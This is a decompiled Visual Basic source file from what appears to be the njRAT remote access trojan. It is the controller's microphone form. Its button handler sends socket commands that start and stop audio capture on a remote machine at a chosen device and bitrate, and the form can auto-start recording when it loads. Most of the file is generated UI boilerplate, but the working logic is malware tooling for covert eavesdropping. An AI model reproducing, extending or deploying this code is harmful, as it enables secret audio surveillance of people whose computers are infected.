Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My.Resources

Namespace NJRAT
	' Token: 0x02000016 RID: 22
	<DesignerGenerated()>
	Public Partial Class Mic
		Inherits Form

		' Token: 0x060003BF RID: 959 RVA: 0x00023560 File Offset: 0x00021760
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Mic.__ENCList
			SyncLock _ENCList
				If Mic.__ENCList.Count = Mic.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Mic.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Mic.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Mic.__ENCList(num) = Mic.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Mic.__ENCList.RemoveRange(num, Mic.__ENCList.Count - num)
					Mic.__ENCList.Capacity = Mic.__ENCList.Count
				End If
				Mic.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x17000161 RID: 353
		' (get) Token: 0x060003C2 RID: 962 RVA: 0x00024194 File Offset: 0x00022394
		' (set) Token: 0x060003C3 RID: 963 RVA: 0x000241AC File Offset: 0x000223AC
		Friend Overridable Property vmethod_4 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_4_Tick
				If Me._vmethod_4 IsNot Nothing Then
					RemoveHandler Me._vmethod_4.Tick, value2
				End If
				Me._vmethod_4 = value
				If Me._vmethod_4 IsNot Nothing Then
					AddHandler Me._vmethod_4.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000162 RID: 354
		' (get) Token: 0x060003C4 RID: 964 RVA: 0x00024204 File Offset: 0x00022404
		' (set) Token: 0x060003C5 RID: 965 RVA: 0x00002AFA File Offset: 0x00000CFA
		Friend Overridable Property ProgressBar1 As ProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._ProgressBar1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ProgressBar)
				Me._ProgressBar1 = value
			End Set
		End Property

		' Token: 0x17000163 RID: 355
		' (get) Token: 0x060003C6 RID: 966 RVA: 0x0002421C File Offset: 0x0002241C
		' (set) Token: 0x060003C7 RID: 967 RVA: 0x00002B03 File Offset: 0x00000D03
		Friend Overridable Property FormSkin1 As FormSkin
			<DebuggerNonUserCode()>
			Get
				Return Me._FormSkin1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FormSkin)
				Me._FormSkin1 = value
			End Set
		End Property

		' Token: 0x17000164 RID: 356
		' (get) Token: 0x060003C8 RID: 968 RVA: 0x00024234 File Offset: 0x00022434
		' (set) Token: 0x060003C9 RID: 969 RVA: 0x00002B0C File Offset: 0x00000D0C
		Friend Overridable Property ComboBox2 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Me._ComboBox2 = value
			End Set
		End Property

		' Token: 0x17000165 RID: 357
		' (get) Token: 0x060003CA RID: 970 RVA: 0x0002424C File Offset: 0x0002244C
		' (set) Token: 0x060003CB RID: 971 RVA: 0x00002B15 File Offset: 0x00000D15
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x17000166 RID: 358
		' (get) Token: 0x060003CC RID: 972 RVA: 0x00024264 File Offset: 0x00022464
		' (set) Token: 0x060003CD RID: 973 RVA: 0x0002427C File Offset: 0x0002247C
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				If Me._Button1 IsNot Nothing Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				If Me._Button1 IsNot Nothing Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000167 RID: 359
		' (get) Token: 0x060003CE RID: 974 RVA: 0x000242D4 File Offset: 0x000224D4
		' (set) Token: 0x060003CF RID: 975 RVA: 0x00002B1E File Offset: 0x00000D1E
		Friend Overridable Property ComboBox1 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Me._ComboBox1 = value
			End Set
		End Property

		' Token: 0x17000168 RID: 360
		' (get) Token: 0x060003D0 RID: 976 RVA: 0x000242EC File Offset: 0x000224EC
		' (set) Token: 0x060003D1 RID: 977 RVA: 0x00002B27 File Offset: 0x00000D27
		Friend Overridable Property FlatMini2 As FlatMini
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatMini2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatMini)
				Me._FlatMini2 = value
			End Set
		End Property

		' Token: 0x17000169 RID: 361
		' (get) Token: 0x060003D2 RID: 978 RVA: 0x00024304 File Offset: 0x00022504
		' (set) Token: 0x060003D3 RID: 979 RVA: 0x0002431C File Offset: 0x0002251C
		Friend Overridable Property FlatButton2 As FlatButton
			<DebuggerNonUserCode()>
			Get
				Return Me._FlatButton2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As FlatButton)
				Dim value2 As EventHandler = AddressOf Me.FlatButton2_Click
				If Me._FlatButton2 IsNot Nothing Then
					RemoveHandler Me._FlatButton2.Click, value2
				End If
				Me._FlatButton2 = value
				If Me._FlatButton2 IsNot Nothing Then
					AddHandler Me._FlatButton2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700016A RID: 362
		' (get) Token: 0x060003D4 RID: 980 RVA: 0x00024374 File Offset: 0x00022574
		' (set) Token: 0x060003D5 RID: 981 RVA: 0x00002B30 File Offset: 0x00000D30
		Friend Overridable Property PictureBox4 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox4 = value
			End Set
		End Property

		' Token: 0x1700016B RID: 363
		' (get) Token: 0x060003D6 RID: 982 RVA: 0x0002438C File Offset: 0x0002258C
		' (set) Token: 0x060003D7 RID: 983 RVA: 0x00002B39 File Offset: 0x00000D39
		Friend Overridable Property UserImage1 As UserImage
			<DebuggerNonUserCode()>
			Get
				Return Me._UserImage1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UserImage)
				Me._UserImage1 = value
			End Set
		End Property

		' Token: 0x060003D8 RID: 984 RVA: 0x000243A4 File Offset: 0x000225A4
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.Mic_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Mic_Load
			Mic.__ENCAddToList(Me)
			Me.QQ = String.Empty
			Me.InitializeComponent()
		End Sub

		' Token: 0x060003D9 RID: 985 RVA: 0x000243F4 File Offset: 0x000225F4
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			If Operators.CompareString(Me.Button1.Text, "Start", False) = 0 Then
				Me.Button1.Text = "Stop"
				Me.Button1.Image = Resources.control_pause_blue
				Me.ComboBox1.Enabled = False
				Me.ComboBox2.Enabled = False
				Dim value As Integer = 0
				If Me.ComboBox2.Text.Contains("16bit") Then
					value = 1
				End If
				Me.sk.Send(String.Concat(New String() { "~", Class7.string_1, Me.ComboBox1.SelectedIndex.ToString(), Class7.string_1, Conversions.ToString(CInt(Math.Round(Math.Round(Conversions.ToDouble(Me.ComboBox2.Text.Split(New Char() { " "c })(0)) * 1024.0)))), Class7.string_1, Conversions.ToString(value) }))
			Else
				Me.sk.Send("~" + Class7.string_1 + "-1")
				Me.Button1.Image = Resources.control_play_blue
				Me.Button1.Text = "Start"
				Me.ComboBox1.Enabled = True
				Me.ComboBox2.Enabled = True
			End If
		End Sub

		' Token: 0x060003DA RID: 986 RVA: 0x00024568 File Offset: 0x00022768
		Private Sub Mic_FormClosing(sender As Object, e As FormClosingEventArgs)
			Try
				If Me.sk.CN Then
					Me.sk.Send("~" + Class7.string_1 + "-1")
				End If
				Me.sk.CN = False
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060003DB RID: 987 RVA: 0x000245DC File Offset: 0x000227DC
		Private Sub Mic_Load(sender As Object, e As EventArgs)
			Try
				Me.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.osk.L)))
				Me.Text = Class6.smethod_17(0L) + " " + Me.QQ
			Catch ex As Exception
			End Try
			If Me.ComboBox1.Items.Count = 0 Then
				Me.Close()
			Else
				Me.Button1.ImageAlign = ContentAlignment.MiddleLeft
				Me.Button1.Image = Resources.control_play_blue
				Me.ComboBox1.SelectedIndex = 0
				If Class7.class8_0.int_1 > Me.ComboBox2.Items.Count - 1 Then
					Class7.class8_0.int_1 = 0
				End If
				Me.ComboBox2.SelectedIndex = Class7.class8_0.int_1
				If Class7.class8_0.bool_8 Then
					Me.Button1_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e)
				End If
			End If
		End Sub

		' Token: 0x060003DC RID: 988 RVA: 0x00024708 File Offset: 0x00022908
		Private Sub vmethod_4_Tick(sender As Object, e As EventArgs)
			Try
				If Me.osk Is Nothing Or Me.sk Is Nothing Then
					Me.Close()
					Return
				End If
				If Not Me.osk.CN Or Not Me.sk.CN Then
					Me.Close()
				End If
			Catch ex As Exception
			End Try
			Me.ProgressBar1.Value = Me.sk.rp()
		End Sub

		' Token: 0x060003DD RID: 989 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060003DE RID: 990 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub Button1_Click_2(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060003DF RID: 991 RVA: 0x00002050 File Offset: 0x00000250
		Private Sub Label1_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060003E0 RID: 992 RVA: 0x00002199 File Offset: 0x00000399
		Private Sub FlatButton2_Click(sender As Object, e As EventArgs)
			Me.Close()
		End Sub

		' Token: 0x040001B6 RID: 438
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x040001B8 RID: 440
		<AccessedThroughProperty("vmethod_4")>
		Private _vmethod_4 As Timer

		' Token: 0x040001B9 RID: 441
		<AccessedThroughProperty("ProgressBar1")>
		Private _ProgressBar1 As ProgressBar

		' Token: 0x040001BA RID: 442
		<AccessedThroughProperty("FormSkin1")>
		Private _FormSkin1 As FormSkin

		' Token: 0x040001BB RID: 443
		<AccessedThroughProperty("ComboBox2")>
		Private _ComboBox2 As ComboBox

		' Token: 0x040001BC RID: 444
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x040001BD RID: 445
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x040001BE RID: 446
		<AccessedThroughProperty("ComboBox1")>
		Private _ComboBox1 As ComboBox

		' Token: 0x040001BF RID: 447
		<AccessedThroughProperty("FlatMini2")>
		Private _FlatMini2 As FlatMini

		' Token: 0x040001C0 RID: 448
		<AccessedThroughProperty("FlatButton2")>
		Private _FlatButton2 As FlatButton

		' Token: 0x040001C1 RID: 449
		<AccessedThroughProperty("PictureBox4")>
		Private _PictureBox4 As PictureBox

		' Token: 0x040001C2 RID: 450
		<AccessedThroughProperty("UserImage1")>
		Private _UserImage1 As UserImage

		' Token: 0x040001C3 RID: 451
		Public osk As Client

		' Token: 0x040001C4 RID: 452
		Public QQ As String

		' Token: 0x040001C5 RID: 453
		Public sk As Client
	End Class
End Namespace
